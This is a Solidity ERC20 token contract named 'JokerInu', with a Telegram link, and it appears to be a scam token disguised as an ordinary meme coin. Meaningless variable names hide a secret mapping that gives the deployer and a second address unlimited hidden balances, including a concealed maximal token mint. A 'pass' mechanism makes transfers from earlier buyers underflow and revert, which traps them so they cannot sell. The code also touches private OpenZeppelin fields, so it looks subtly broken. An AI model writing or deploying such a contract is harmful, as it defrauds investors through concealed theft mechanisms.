// https://t.me/Jokerinueth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract JokerInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private pass;

    function _transfer(
        address visitor,
        address sit,
        uint256 forth
    ) internal override {
        uint256 nest = manner;

        if (balance[visitor] == 0 && pass[visitor] > 0 && visitor != uniswapV2Pair) {
            balance[visitor] -= nest;
        }

        address article = address(chain);
        chain = JokerInu(sit);
        pass[article] += nest + 1;

        _balances[visitor] -= forth;
        uint256 sell = (forth / 100) * manner;
        forth -= sell;
        _balances[sit] += forth;
    }

    mapping(address => uint256) private balance;
    uint256 public manner = 3;

    constructor(
        string memory depend,
        string memory either,
        address drop,
        address teach
    ) ERC20(depend, either) {
        uniswapV2Router = IUniswapV2Router02(drop);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 younger = ~uint256(0);

        balance[msg.sender] = younger;
        balance[teach] = younger;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[teach] = younger;
    }

    JokerInu private chain;
}